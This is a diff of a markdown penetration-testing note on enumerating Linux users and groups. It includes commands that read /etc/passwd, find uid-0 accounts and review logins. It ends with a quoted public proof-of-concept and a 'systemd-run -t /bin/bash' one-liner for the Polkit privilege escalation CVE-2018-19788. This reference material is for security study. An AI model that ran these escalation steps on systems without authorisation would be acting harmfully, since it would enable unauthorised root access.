@@ -6,17 +6,15 @@ tags:
 links: "[[Privesc]]"
 ---
 
+<!-- User Enumeration {{{-->
 # User Enumeration
 
 Enumerate current user and group
 
 ___
 
-<!-- User {{{-->
-## User
-
 <!-- Identify {{{-->
-### Identify
+## Identify
 
 [whoami](https://en.wikipedia.org/wiki/Whoami) —
 Display the currently logged in user on the system
@@ -24,10 +22,27 @@ Display the currently logged in user on the system
 ```sh
 whoami
 ```
+
+___
 <!-- }}} -->
 
+<!-- Discover {{{-->
+## Discover
+
+List users with console
+
+```sh
+cat /etc/passwd | grep "sh$"
+```
+
+List users (*including service users*)
+
+```sh
+cat /etc/passwd | cut -d: -f1
+```
+
 <!-- Home Directories {{{-->
-### Home Directories
+#### Home Directories
 
 Discover users and their home directories
 
@@ -38,7 +53,7 @@ ls /home
 <!-- }}} -->
 
 <!-- Login {{{-->
-### Login
+#### Login
 
 [w](https://linux.die.net/man/1/w) —
 List currently logged in users
@@ -61,11 +76,33 @@ w
 > ```
 <!-- }}} -->
 
+[last](https://linux.die.net/man/1/last) —
+Show listing of last logged in users
+
+```sh
+last | tail
+```
+
 [lastlog](https://linux.die.net/man/8/lastlog) —
 Report the most recent login of all users or of a given user
 
 ```sh
 lastlog
+```
+
+```sh
+lastlog -u <user>
+```
+
+<!-- }}} -->
+
+<!-- Superusers {{{-->
+#### Superusers
+
+Discover [Superusers](https://en.wikipedia.org/wiki/Superuser)
+
+```sh
+awk -F: '($3 == "0") {print}' /etc/passwd
 ```
 
 <!-- }}} -->
@@ -76,8 +113,23 @@ ___
 <!-- Group {{{-->
 ## Group
 
+[groups](https://linux.die.net/man/1/groups) —
+print the groups a user is in
+
+```sh
+groups [user]
+```
+
+<!-- Tip {{{-->
+> [!tip]- Privileged Groups
+>
+> [[Group#Privileged Groups]]
+<!-- }}} -->
+
+<!-- }}} -->
+
 <!-- id {{{-->
-### id
+## id
 
 Display the system identifications of a specified user
 
@@ -87,20 +139,6 @@ Display the system identifications of a specified user
 > - [Cyberciti - Linux/Unix id Command Examples](https://www.cyberciti.biz/faq/unix-linux-id-command-examples-usage-syntax/)
 > - [IBM - id Command](https://www.ibm.com/docs/en/aix/7.3.0?topic=i-id-command)
 <!-- }}} -->
-
-<!-- Tip {{{-->
-> [!tip]
->
-> [[Find]] files belonging to a group
->
-> ```sh
-> find / -group <group_name> 2>/dev/null
-> ```
->
-> [[Directory & File|Enumerate]] found files
->
-<!-- }}} -->
-
 
 [id](https://linux.die.net/man/1/id) —
 Find a user’s
@@ -126,8 +164,58 @@ Specific user
 id -u <user>
 ```
 
+<!-- CVE-2018-19788 {{{-->
+### CVE-2018-19788
+
+[CVE-2018-19788](https://nvd.nist.gov/vuln/detail/CVE-2018-19788) —
+[[Polkit]] `0.115` allows a user with a `uid` greater than `INT_MAX`
+to successfully execute any systemctl command
+
+```sh
+systemd-run -t /bin/bash
+```
+
+<!-- Exploit {{{-->
+> [!tip]- Exploit
+>
+> [GitHub - mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
+>
+> ```sh
+> #!/bin/bash
+> # PoC for CVE-2018-19788
+> # Rich Mirch
+> #
+> # Write-up: https://blog.mirch.io/2018/12/09/cve-2018-19788-poc-polkit-improper-handling-of-user-with-uid-int_max-leading-to-authentication-bypass/
+>
+> cat >woot.service<<EOF
+> [Unit]
+> Description=Woot
+>
+> [Service]
+> Type=notify
+> ExecStart=/bin/bash -c "echo woot \$(id)|wall"
+> KillMode=process
+> Restart=on-failure
+> RestartSec=42s
+>
+> [Install]
+> WantedBy=multi-user.target
+> EOF
+>
+> systemctl link $PWD/woot.service
+> systemctl start woot
+> ```
+>
+> One-liner (*source [Twitter - ParagonSEC](https://twitter.com/paragonsec/status/1071152249529884674)*)
+>
+> ```sh
+> systemd-run -t /bin/bash
+> ```
 <!-- }}} -->
 
+<!-- }}} -->
 
 ___
+<!-- }}} -->
+
 <!-- }}} -->
